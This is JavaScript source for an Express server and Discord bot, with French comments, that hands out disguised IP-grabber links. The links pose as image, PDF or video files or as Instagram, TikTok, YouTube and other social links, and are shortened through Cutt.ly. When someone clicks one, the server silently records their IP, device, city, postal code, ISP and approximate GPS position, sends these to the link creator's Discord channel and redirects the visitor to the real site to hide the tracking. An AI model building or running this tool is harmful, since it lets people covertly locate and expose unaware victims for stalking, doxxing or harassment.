require('dotenv').config();
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const cors = require('cors');
const DeviceDetector = require('device-detector-js');
const {
  Client,
  GatewayIntentBits,
  Partials,
  Events,
  ButtonBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonStyle,
  ChannelType,
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');

const app = express();
app.use(cors());

const port = process.env.PORT || 3000;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
const CUTTLY_API_KEY = process.env.CUTTLY_API_KEY;
const BDC_TOKEN = process.env.BDC_TOKEN;
const CLIENTS_FILE = './clients.json';
const deviceDetector = new DeviceDetector();

let lookup;
const maxmind = require('maxmind');
(async () => {
  lookup = await maxmind.open('./GeoLite2-City.mmdb');
})();

// Fonction de raccourcissement Cutt.ly avec 3 essais
async function shortenWithCuttly(longUrl, baseSuffix) {
  for (let i = 0; i <= 3; i++) {
    let suffix = i === 0 ? baseSuffix : `${baseSuffix}-${i}`;
    try {
      const response = await axios.get('https://cutt.ly/api/api.php', {
        params: {
          key: CUTTLY_API_KEY,
          short: longUrl,
          name: suffix
        }
      });

      const data = response.data;
      if (data.url.status === 7) {
        return data.url.shortLink;
      }
    } catch (err) {
      console.error(`Erreur Cutt.ly (essai ${i}) :`, err.response?.data || err.message);
    }
  }
  return null;
}

// Fonction commune pour envoyer un embed IP
async function logIp(req, res, redirectUrl = null) {
  const u = req.query.u;
  if (!u) return res.redirect('https://google.com');

  const rawIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const ip = rawIp.split(',')[0].trim();
  const userAgent = req.headers['user-agent'];
  const device = deviceDetector.parse(userAgent);

  // Ignore les bots et "Inconnu-Inconnu"
  if (!device.client?.name && !device.os?.name) {
    console.log(`⛔ Ignoré - Appareil inconnu pour IP ${ip}`);
    if (redirectUrl) {
      return res.redirect(redirectUrl);
    } else {
      return res.status(204).send();
    }
  }

  let geo = {};
  let bigdata = {};

  try {
    geo = lookup.get(ip) || {};
  } catch {}

  try {
    const { data } = await axios.get(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${ip}&localityLanguage=fr&key=${BDC_TOKEN}`);
    bigdata = data;
  } catch {}

  const coordsMaxMind = geo?.location ? `${geo.location.latitude},${geo.location.longitude}` : null;
  const coordsBigData = bigdata?.location ? `${bigdata.location.latitude},${bigdata.location.longitude}` : null;
  const bestCoords = coordsBigData || coordsMaxMind;
  const coordsField = bestCoords
    ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
    : '❌ Introuvable';

  const embed = new EmbedBuilder()
    .setTitle('📥 Nouvelle connexion détectée')
    .addFields(
      { name: 'IP', value: `\`${ip}\`` },
      { name: 'Appareil', value: `${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}` },
      { name: 'Pays', value: geo?.country?.names?.fr || '❌ Introuvable', inline: true },
      { name: 'Région', value: geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable', inline: true },
      { name: 'Ville', value: geo?.city?.names?.fr || '❌ Introuvable', inline: true },
      { name: 'Code Postal', value: geo?.postal?.code || '❌ Introuvable', inline: true },
      { name: 'FAI', value: geo?.traits?.isp || '❌ Introuvable', inline: true },
      { name: 'Localisation GPS', value: coordsField }
    )
    .setColor(0x00AE86)
    .setTimestamp();

  try {
    if (fs.existsSync(CLIENTS_FILE)) {
      const clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
      const channelId = clients[u];
      if (channelId) {
        await axios.post(`https://discord.com/api/v10/channels/${channelId}/messages`, {
          embeds: [embed]
        }, {
          headers: {
            Authorization: `Bot ${DISCORD_TOKEN}`,
            'Content-Type': 'application/json'
          }
        });
      }
    }
  } catch (err) {
    console.error("Erreur Discord:", err.message);
  }

  if (redirectUrl) {
    return res.redirect(redirectUrl);
  } else {
    return res.status(204).send();
  }
}

// Routes Express
app.get('/:type', async (req, res) => {
  const { type } = req.params;

  if (['image.jpg', 'video.mp4', 'document.pdf'].includes(type)) {
    await logIp(req, res);
  } else {
    const redirectUrl = type === 'x' ? 'https://x.com' : `https://${type}.com`;
    await logIp(req, res, redirectUrl);
  }
});

app.listen(port, () => {
  console.log(`🚀 Serveur Express actif sur le port ${port}`);
});
// Discord Bot
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
  partials: [Partials.Channel]
});

client.once(Events.ClientReady, () => {
  console.log(`🤖 Bot connecté en tant que ${client.user.tag}`);
});

client.on(Events.InteractionCreate, async interaction => {
  if (interaction.isButton() && interaction.customId === 'generate_tracker') {
    if (interaction.replied || interaction.deferred) return;
    await interaction.reply({ content: "🔄 Création de ton salon privé...", ephemeral: true });

    const guild = interaction.guild;
    const user = interaction.user;
    const shortId = crypto.randomBytes(3).toString("hex");
    const channelName = `🔗・mon-lien-tracker-${shortId}`;

    const privateChannel = await guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: guild.roles.everyone, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory], deny: [
          PermissionsBitField.Flags.SendMessages,
          PermissionsBitField.Flags.AttachFiles,
          PermissionsBitField.Flags.EmbedLinks,
          PermissionsBitField.Flags.MentionEveryone,
          PermissionsBitField.Flags.AddReactions
        ] },
        { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.EmbedLinks, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ManageChannels] }
      ]
    });

    const select = new StringSelectMenuBuilder()
      .setCustomId('select_tracker_type')
      .setPlaceholder('Choisis ton type de lien')
      .addOptions(
        { label: 'Image (.jpg)', value: 'image.jpg', emoji: '📸' },
        { label: 'Document (.pdf)', value: 'document.pdf', emoji: '📄' },
        { label: 'Vidéo (.mp4)', value: 'video.mp4', emoji: '🎥' },
        { label: 'Instagram', value: 'instagram', emoji: '🌐' },
        { label: 'YouTube', value: 'youtube', emoji: '🌐' },
        { label: 'TikTok', value: 'tiktok', emoji: '🌐' },
        { label: 'Facebook', value: 'facebook', emoji: '🌐' },
        { label: 'Twitter (X)', value: 'x', emoji: '🌐' },
        { label: 'Discord', value: 'discord', emoji: '🌐' }
      );

    const row = new ActionRowBuilder().addComponents(select);

    await privateChannel.send({
      content: `🔍 Choisis le type de lien que tu veux générer :`,
      components: [row]
    });

    const uniqueId = `${user.id}_${shortId}`;
    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }
    clients[uniqueId] = privateChannel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
  }
});
client.on(Events.InteractionCreate, async interaction => {
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_tracker_type') {
    if (interaction.replied || interaction.deferred) return;
    await interaction.reply({ content: "🔗 Génération de ton lien...", ephemeral: true });

    const user = interaction.user;
    const channel = interaction.channel;
    const selection = interaction.values[0];
    const shortId = crypto.randomBytes(3).toString("hex");
    const uniqueId = `${user.id}_${shortId}`;
    const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');

    let generatedUrl;
    if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(selection)) {
      generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
    } else {
      generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
    }

    const suffix = selection.replace(/\./g, '-');
    const shortLink = await shortenWithCuttly(generatedUrl, suffix) || generatedUrl;

    await channel.send(`✅ Ton lien est prêt :\n${shortLink}`);

    let clients = {};
    if (fs.existsSync(CLIENTS_FILE)) {
      clients = JSON.parse(fs.readFileSync(CLIENTS_FILE));
    }
    clients[uniqueId] = channel.id;
    fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
  }
});

client.login(DISCORD_TOKEN);
